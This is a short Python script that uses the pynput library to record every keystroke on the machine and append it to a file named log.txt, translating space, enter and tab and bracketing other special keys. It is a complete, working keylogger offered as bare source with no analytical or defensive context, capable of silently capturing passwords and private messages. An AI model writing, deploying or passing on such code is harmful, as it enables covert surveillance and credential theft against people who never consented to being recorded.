from pynput.keyboard import Listener, Key

def writeData(key):
    try:
        letter = key.char
    except AttributeError:
        if key == Key.space:
            letter = ' '
        elif key == Key.enter:
            letter = '\n'
        elif key == Key.tab:
            letter = '\t'
        else:
            letter = f'[{key.name}]'

    with open("log.txt", "a") as file:
        file.write(letter)

with Listener(on_press=writeData) as listener:
    listener.join()
